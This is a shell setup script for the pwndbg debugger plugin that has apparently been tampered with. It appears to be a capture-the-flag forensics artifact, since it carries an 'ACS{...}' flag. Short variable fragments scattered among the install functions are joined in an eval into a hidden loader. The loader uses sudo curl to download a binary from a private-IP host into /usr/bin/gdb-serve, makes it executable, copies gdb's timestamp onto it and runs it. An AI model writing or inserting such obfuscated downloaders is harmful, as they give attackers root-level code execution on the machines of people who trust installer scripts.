#!/usr/bin/env bash
set -e

source "$(dirname "$0")/scripts/common.sh"
z="
";Sz='b"';pz='b5';oBz='ch';

# If we are a root in a container and `sudo` doesn't exist
# lets overwrite it with a function that just executes things passed to sudo
# (yeah it won't work for sudo executed with flags)
if ! hash sudo 2> /dev/null && whoami | grep -q root; then
    sudo() {
        ${*}
    }
fi

# Helper functions
linux() {
    uname | grep -iqs Linux
}
osx() {
    uname | grep -iqs Darwin
}
pBz='r ';XBz='";';uBz='/g';iz='AG';

install_apt() {
    sudo apt-get update || true
    sudo apt-get install -y git gdb gdbserver python3-dev python3-venv python3-setuptools libglib2.0-dev libc6-dbg curl

    if uname -m | grep -q x86_64; then
        sudo dpkg --add-architecture i386 || true
        sudo apt-get update || true
        sudo apt-get install -y libc6-dbg:i386 libgcc-s1:i386 || true
    fi
}
Wz='AM';SBz='E_';Fz='RL';Iz='tp';Bz='WN';

install_dnf() {
    sudo dnf update || true
    sudo dnf -y install gdb gdb-gdbserver python-devel python3-devel glib2-devel make curl
    sudo dnf -y debuginfo-install glibc
}
Hz='ht';wBz='"';kBz=' +';RBz='IL';Oz=':6';

install_xbps() {
    sudo xbps-install -Su
    sudo xbps-install -Sy gdb gcc python-devel python3-devel glibc-devel make curl
    sudo xbps-install -Sy glibc-dbg
}
jz='AC';Uz='LE';uz='68';UBz='ME';az='r/';
bz='bi';DBz='a7';jBz='od';
wz='fc';dz='b-';yz='25';iBz='hm';
hz='FL';nBz='ou';VBz='" ';sz='96';

install_swupd() {
    sudo swupd update || true
    sudo swupd bundle-add gdb python3-basic make c-basic curl
}
EBz='}"';Rz='gd';Zz='us';gBz='do';
mBz='E"';bBz='ex';
CBz='89';cBz='it';eBz='fi';

install_zypper() {
    sudo zypper mr -e repo-oss-debug || sudo zypper mr -e repo-debug
    sudo zypper refresh || true
    sudo zypper install -y gdb gdbserver python-devel python3-devel glib2-devel make glibc-debuginfo curl
    sudo zypper install -y python2-pip || true # skip py2 installation if it doesn't exist

    if uname -m | grep -q x86_64; then
        sudo zypper install -y glibc-32bit-debuginfo || true
    fi
}

install_emerge() {
    sudo emerge --oneshot --deep --newuse --changed-use --changed-deps dev-lang/python dev-debug/gdb
}
xz='20';dBz=' 1';kz='S{';fBz='su';
NBz='L ';hBz=' c';vz='b9';vBz='db';
LBz='rl';Gz='="';BBz='ab';nz='00';
Kz='/1';Jz=':/';Tz='FI';

install_oma() {
    sudo oma refresh || true
    sudo oma install -y gdb python-3 glib make glibc-dbg curl

    if uname -m | grep -q x86_64; then
        sudo oma install -y glibc+32-dbg || true
    fi
}
KBz='cu';aBz='n';Lz='0.';Pz='/p';PBz=' "';

install_pacman() {
    read -p "Do you want to do a full system update? (y/n) [n] " answer
    # user want to perform a full system upgrade
    answer=${answer:-n} # n is default
    if [[ "$answer" == "y" ]]; then
        sudo pacman -Syu || true
    fi
    sudo pacman -S --noconfirm --needed git gdb python which debuginfod curl
    if [ -z "$UPDATE_MODE" ]; then
        if ! grep -qs "^set debuginfod enabled on" ~/.gdbinit; then
            echo "set debuginfod enabled on" >> ~/.gdbinit
            echo "[*] Added 'set debuginfod enabled on' to ~/.gdbinit"
        fi
    fi
}
IBz='ud';rz='61';Ez='_U';
WBz='"$';ez='se';qBz='/u';cz='n/';

install_freebsd() {
    sudo pkg install git gdb python py39-pip cmake gmake curl
    which rustc || sudo pkg install rust
}
MBz=' -';FBz='if';
JBz='o ';YBz=' t';tz='62';Cz='LO';
Vz='_N';qz='c9';mz='24';
Xz='E=';QBz='$F';oz='fa';gz='e"';

usage() {
    echo "Usage: $0 [--update]"
    echo "  --update: Install/update dependencies without checking ~/.gdbinit"
}

UPDATE_MODE=
for arg in "$@"; do
    case $arg in
        --update)
            UPDATE_MODE=1
            ;;
        -h | --help)
            set +x
            usage
            exit 0
            ;;
        *)
            set +x
            echo "Unknown argument: $arg"
            usage
            exit 1
            ;;
    esac
done
Nz='11';GBz=' !';TBz='NA';
Qz='wn';ZBz='he';HBz=' s';lBz='x ';Yz='"/';

PYTHON=''
Az='DO';ABz='66';
OBz='-o';

if osx; then
    echo "Not supported on macOS. Please use one of the alternative methods listed at:"
    echo "https://pwndbg.re/dev/contributing/setup-pwndbg-dev/"
    exit 1
fi

if linux; then
    distro=$(grep "^ID=" /etc/os-release | cut -d'=' -f2 | sed -e 's/"//g')

    case $distro in
        "ubuntu")
            install_apt
            ;;
        "fedora")
            install_dnf
            ;;
        "clear-linux-os")
            install_swupd
            ;;
        "opensuse-leap" | "opensuse-tumbleweed")
            install_zypper
            ;;
        "arch" | "archarm" | "endeavouros" | "manjaro" | "garuda" | "cachyos" | "archcraft" | "artix")
            install_pacman
            echo "Logging off and in or conducting a power cycle is required to get debuginfod to work."
            echo "Alternatively you can manually set the environment variable: DEBUGINFOD_URLS=https://debuginfod.archlinux.org"
            ;;
        "void")
            install_xbps
            ;;
        "gentoo")
            install_emerge
            ;;
        "freebsd")
            install_freebsd
            ;;
        "aosc")
            install_oma
            ;;
        *) # we can add more install command for each distros.
            echo "\"$distro\" is not supported distro. Will search for 'apt', 'dnf' or 'pacman' package managers."
            if hash apt; then
                install_apt
            elif hash dnf; then
                install_dnf
            elif hash pacman; then
                install_pacman
            else
                echo "\"$distro\" is not supported and your distro don't have a package manager that we support currently."
                exit 2
            fi
            ;;
    esac
fi
rBz='sr';sBz='/b';fz='rv';
tBz='in';Mz='10';Dz='AD';lz='6d';

if ! hash gdb; then
    echo "Could not find gdb in $PATH"
    exit 3
fi

# Find the Python used in compilation by GDB.
PYVER=$(gdb -batch -q --nx -ex 'pi import sysconfig; print(sysconfig.get_config_var("VERSION"))')
PYTHON=$(gdb -batch -q --nx -ex 'pi import sysconfig; print(sysconfig.get_config_vars().get("EXENAME", sysconfig.get_config_var("BINDIR")+"/python"+sysconfig.get_config_var("VERSION")+sysconfig.get_config_var("EXE")))')
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Lz$Lz$Nz$Oz$Nz$Nz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$Rz$dz$ez$fz$gz$z$hz$iz$Gz$jz$kz$lz$mz$nz$oz$pz$qz$rz$pz$sz$tz$uz$sz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$Az$Bz$Cz$Dz$Ez$Fz$XBz$YBz$ZBz$aBz$z$bBz$cBz$dBz$z$eBz$z$fBz$gBz$hBz$iBz$jBz$kBz$lBz$WBz$Tz$Uz$Vz$Wz$mBz$z$fBz$gBz$YBz$nBz$oBz$MBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$PBz$QBz$RBz$SBz$TBz$UBz$wBz$z$WBz$Tz$Uz$Vz$Wz$mBz"

if [ ! -x "$PYTHON" ]; then
    echo "Error: '$PYTHON' does not exist or is not executable."
    echo ""
    echo "It looks like GDB is using a different Python version than the one installed via the package manager."
    echo ""
    echo "Possible solutions:"
    echo "  1. Try installing 'python$PYVER' manually using your package manager."
    echo "     Example (for Debian/Ubuntu/Kali): 'sudo apt install python$PYVER'"
    echo "     Example (for Fedora/RHEL): 'sudo dnf install python$PYVER'"
    echo "  2. Verify your GDB configuration and ensure it supports the correct Python version."
    echo ""
    echo "After making the necessary changes, rerun ./setup.sh"
    exit 1
fi

# Check python version supported: <3.10, 3.99>
is_supported=$(echo "$PYVER" | grep -E '3\.(10|11|12|13|14|15|16|17|18|19|[2-9][0-9])' || true)
if [[ -z "$is_supported" ]]; then
    echo "Your system has unsupported python version. Please use older pwndbg release:"
    echo "'git checkout 2024.08.29' - python3.8, python3.9"
    echo "'git checkout 2023.07.17' - python3.6, python3.7"
    exit 4
fi

# Create the python virtual environment
echo "Creating virtualenv in path: ${PWNDBG_VENV_PATH}"
${PYTHON} -m venv -- ${PWNDBG_VENV_PATH}

# Activate venv
source ${PWNDBG_VENV_PATH}/bin/activate

# Install uv inside the venv
pip install uv

# Install dependencies
echo "Installing dependencies.."
uv sync --extra gdb --extra lldb --quiet

if [ -z "$UPDATE_MODE" ]; then
    if grep -qs '^[^#]*source.*pwndbg/gdbinit.py' ~/.gdbinit; then
        echo 'Pwndbg is already sourced in ~/.gdbinit .'
    else
        # Load Pwndbg into GDB on every launch.
        echo "source $PWD/gdbinit.py" >> ~/.gdbinit
        echo "[*] Added 'source $PWD/gdbinit.py' to ~/.gdbinit so that Pwndbg will be loaded on every launch of GDB."
    fi
    echo "Please set the PWNDBG_NO_AUTOUPDATE environment variable to any value"
    echo "to disable the automatic updating of dependencies when Pwndbg is loaded."
fi
